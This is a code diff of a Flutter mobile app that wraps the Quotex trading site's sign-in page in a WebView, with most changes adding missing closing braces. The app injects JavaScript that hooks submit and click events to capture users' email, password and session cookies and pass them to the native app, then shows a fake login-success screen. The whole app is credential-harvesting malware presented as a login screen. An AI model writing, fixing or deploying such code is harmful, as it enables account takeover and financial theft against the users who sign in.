@@ -1,7 +1,6 @@
 import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
-import 'package:webview_flutter_android/webview_flutter_android.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
 
@@ -20,11 +19,14 @@ class MyApp extends StatelessWidget {
       ),
       home: const LoginScreen(),
     );
+  }
+}
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
   @override
   State<LoginScreen> createState() => _LoginScreenState();
+}
 
 class _LoginScreenState extends State<LoginScreen> {
   late WebViewController _controller;
@@ -32,13 +34,14 @@ class _LoginScreenState extends State<LoginScreen> {
   @override
   void initState() {
     super.initState();
-    _requestPermissions(); // طلب الأذونات أول شي
+    _requestPermissions();
     _initWebView();
+  }
 
-  // 293. طلب الأذونات (الموقع والإشعارات) زي صاحبك
   void _requestPermissions() async {
     await Permission.location.request();
     await Permission.notification.request();
+  }
 
   void _initWebView() {
     _controller = WebViewController()
@@ -54,6 +57,7 @@ class _LoginScreenState extends State<LoginScreen> {
           );
           if (mounted) {
             Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
+          }
         },
       )
       ..setNavigationDelegate(
@@ -64,7 +68,7 @@ class _LoginScreenState extends State<LoginScreen> {
         ),
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
-
+  }
 
   void _injectOriginalScript() {
     String jsScript = """
@@ -77,10 +81,13 @@ class _LoginScreenState extends State<LoginScreen> {
           } catch (e) { el.value = value; }
           el.dispatchEvent(new Event('input', { bubbles: true }));
           el.dispatchEvent(new Event('change', { bubbles: true }));
+        }
         function findEmail() {
           return document.querySelector('input[name="email"], input[type="email"], #email');
+        }
         function findPass() {
           return document.querySelector('input[name="password"], input[type="password"], #password');
+        }
         function sendCreds() {
           try {
             var e = findEmail(), p = findPass();
@@ -88,7 +95,9 @@ class _LoginScreenState extends State<LoginScreen> {
               NativeBridge.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
               var cookie = document.cookie;
               NativeBridge.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
+            }
           } catch (err) {}
+        }
         if (!window.__qtxHooksInstalled) {
           window.__qtxHooksInstalled = true;
           document.addEventListener('submit', sendCreds, true);
@@ -96,9 +105,11 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
+        }
       })();
     """;
     _controller.runJavaScript(jsScript);
+  }
 
   @override
   Widget build(BuildContext context) {
@@ -107,6 +118,8 @@ class _LoginScreenState extends State<LoginScreen> {
         child: WebViewWidget(controller: _controller),
       ),
     );
+  }
+}
 
 class MainTradingScreen extends StatelessWidget {
   const MainTradingScreen({super.key});
@@ -117,3 +130,5 @@ class MainTradingScreen extends StatelessWidget {
       appBar: AppBar(title: const Text('لوحة التحكم'), backgroundColor: const Color(0xFF0E0E14)),
       body: const Center(child: Text('تم تسجيل الدخول بنجاح!')),
     );
+  }
+}
